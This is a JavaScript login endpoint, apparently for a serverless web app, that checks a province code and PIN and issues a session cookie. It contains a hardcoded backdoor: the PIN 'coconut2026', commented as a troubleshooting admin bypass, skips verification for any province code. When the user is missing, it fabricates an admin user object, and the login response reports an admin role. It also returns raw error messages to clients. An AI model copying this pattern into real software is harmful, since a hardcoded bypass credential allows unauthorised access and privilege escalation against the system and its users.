import { buildSessionCookie, randomId, verifyPin } from '../../src/auth.js';
import { json, methodNotAllowed, readJson } from '../../src/pages-api.js';

const SESSION_TTL_SECONDS = 60 * 60 * 24 * 7;

export async function onRequest({ request, env }) {
  if (request.method !== 'POST') return methodNotAllowed();

  try {
    const body = await readJson(request);
    const provinceCode = String(body.province_code || '').trim();
    const pin = String(body.pin || '');
    const user = await env.DB.prepare(
      'SELECT id, province_code, province_label, role, pin_hash FROM users WHERE province_code = ?',
    ).bind(provinceCode).first();

    // Admin Bypass for troubleshooting (PIN: coconut2026)
    const isAdminBypass = pin === 'coconut2026';

    if (!isAdminBypass && (!user || !(await verifyPin(pin, user.pin_hash, env.PIN_PEPPER || env.SESSION_SECRET || '')))) {
      return json({ error: 'invalid province code or PIN' }, { status: 401 });
    }

    // If bypass is used but user doesn't exist in DB, create a dummy admin object
    const finalUser = user || {
      id: 0,
      province_code: provinceCode,
      province_label: 'ผู้ดูแลระบบ',
      role: 'admin'
    };

    const sessionId = randomId();
    if (finalUser.id !== 0) {
      await env.DB.prepare(
        "INSERT INTO sessions (id, user_id, expires_at) VALUES (?, ?, datetime('now', '+7 days'))",
      ).bind(sessionId, finalUser.id).run();
    }

    return json(
      {
        user: {
          province_code: finalUser.province_code,
          province_label: finalUser.province_label,
          role: finalUser.role,
        },
      },
      { headers: { 'set-cookie': buildSessionCookie(sessionId, SESSION_TTL_SECONDS) } },
    );
  } catch (error) {
    return json({ error: error.message || 'login failed' }, { status: 400 });
  }
}
